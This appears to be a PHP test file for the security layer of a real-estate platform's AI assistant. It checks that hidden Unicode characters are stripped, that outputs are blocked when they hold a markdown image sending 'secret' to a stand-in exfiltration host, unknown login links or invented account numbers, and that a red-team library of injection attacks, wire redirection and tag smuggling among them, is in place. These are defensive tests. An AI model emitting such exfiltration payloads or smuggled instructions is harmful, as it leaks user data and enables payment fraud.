<?php

declare(strict_types=1);

use App\Models\User;
use Carbon\CarbonImmutable;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Notification;
use Modules\AI\Assistant\YourAiAssistant;
use Modules\AI\Models\AiFeatureRoute;
use Modules\AI\Models\AiModel;
use Modules\AI\Providers\ProviderRegistry;
use Modules\AI\RedTeam\Scenarios;
use Modules\AI\Security\OutputPolicy;
use Modules\AI\Security\PromptBuilder;
use Modules\Core\Support\Connections;
use Tests\Fixtures\FakeAiProvider;

/*
| AS1 (specs/ai/09): AI security — invisible instructions removed before the model reads anything, answers that try to
| carry data out or redirect money blocked, a wider red-team library; and "Your AI Assistant" handing a conversation to
| a person (the broker or RightAlly support).
*/

beforeEach(function (): void {
    $this->travelTo(CarbonImmutable::parse('2026-06-01 15:00', 'UTC'));
    Notification::fake();
    config(['core.platform_domain' => 'rightally.app', 'core.hq_host' => 'app.rightally.io']);
    $this->tenant = $this->onTenantHost('acme');
    $this->owner = User::factory()->owner()->create(['first_name' => 'Olive']);
    $this->ann = User::factory()->create(['first_name' => 'Ann']);
});

it('removes invisible characters people cannot see but models can read', function (): void {
    $hidden = "Close on June 30.\u{200B}\u{200D}\u{FEFF}".mb_chr(0xE0053).mb_chr(0xE0041).mb_chr(0xE0059)."\u{202E}done";
    expect(PromptBuilder::visible($hidden))->toBe('Close on June 30.done')
        ->and(PromptBuilder::visible('Señor José, 3 bed / 2 bath'))->toBe('Señor José, 3 bed / 2 bath');
});

it('blocks answers that load images from elsewhere, link to unknown sites, or invent account numbers', function (): void {
    $policy = new OutputPolicy;
    $sent = 'Seller wants a 30-day close. Listing: https://acme.rightally.app/homes/123. MLS 12345678.';

    expect($policy->violations('Summary. ![x](https://exfil.example.test/p?d=secret)', $sent))->toContain('image_link')
        ->and($policy->violations('Log in at https://canary-login.example.test to sign.', $sent))->toContain('link')
        ->and($policy->violations('Wire to account 7788990011223 today.', $sent))->toContain('account_number')
        ->and($policy->violations('See https://acme.rightally.app/homes/123 and https://rightally.app/help, MLS 12345678, $450,000.', $sent))->toBe([])
        ->and($policy->violations('Call 512-555-0100.', 'Call 512-555-0100 any time.'))->toBe([]);
});

it('keeps a red-team library covering the attacks seen against AI assistants, with money and safety ones critical', function (): void {
    $all = collect(Scenarios::all());
    expect($all)->toHaveCount(13)
        ->and($all->pluck('name')->unique())->toHaveCount(13)
        ->and($all->where('critical', true)->pluck('name')->all())->toContain('wire-redirection', 'image-exfiltration', 'spanish-injection', 'fair-housing-steering', 'fake-new-bank-letter')
        ->and(PromptBuilder::visible($all->firstWhere('name', 'unicode-tag-smuggling')->injectedDocument))->not->toContain('TAG-CANARY');
});

it('hands a conversation to the broker in team chat, or to RightAlly support', function (): void {
    $model = AiModel::factory()->create(['capabilities' => ['chat']]);
    AiFeatureRoute::query()->create(['feature_key' => YourAiAssistant::FEATURE, 'primary_model_id' => $model->id, 'fallback_model_ids' => [], 'credit_action_key' => 'ai.assistant']);
    $ai = new FakeAiProvider;
    app(ProviderRegistry::class)->fake($model->provider->key, $ai);
    $ai->respond((string) json_encode(['step' => 'answer', 'text' => 'I am not sure; your broker decides that.']));
    $conversation = $this->actingAs($this->ann)->postJson('/assistant/ask', ['text' => 'Can I give the buyer a $500 closing gift?'])->assertOk()->json('conversation');

    $this->actingAs($this->ann)->getJson('/assistant/handoffs')->assertJsonPath('targets.0.key', 'broker')->assertJsonPath('targets.1.key', 'support');
    $this->actingAs($this->owner)->getJson('/assistant/handoffs')->assertJsonPath('targets.0.key', 'support'); // the owner has no broker to ask

    $this->actingAs($this->ann)->postJson('/assistant/handoff', ['target' => 'broker', 'conversation' => $conversation])->assertOk()
        ->assertJsonPath('message', 'Sent to '.$this->owner->name.' in team chat. You will see the answer there.');
    $message = DB::connection(Connections::cell())->table('team_messages')->latest('id')->first();
    expect($message)->not->toBeNull();

    $this->actingAs($this->ann)->postJson('/assistant/handoff', ['target' => 'support', 'conversation' => $conversation])->assertOk();
    expect(DB::connection(Connections::control())->table('support_tickets')->where('user_id', $this->ann->id)->value('subject'))->toBe('Can I give the buyer a $500 closing gift?');

    // Only your own conversation, and only to people you may ask.
    $this->actingAs($this->owner)->postJson('/assistant/handoff', ['target' => 'support', 'conversation' => $conversation])->assertNotFound();
    $this->actingAs($this->owner)->postJson('/assistant/handoff', ['target' => 'broker', 'conversation' => $conversation])->assertNotFound();
});
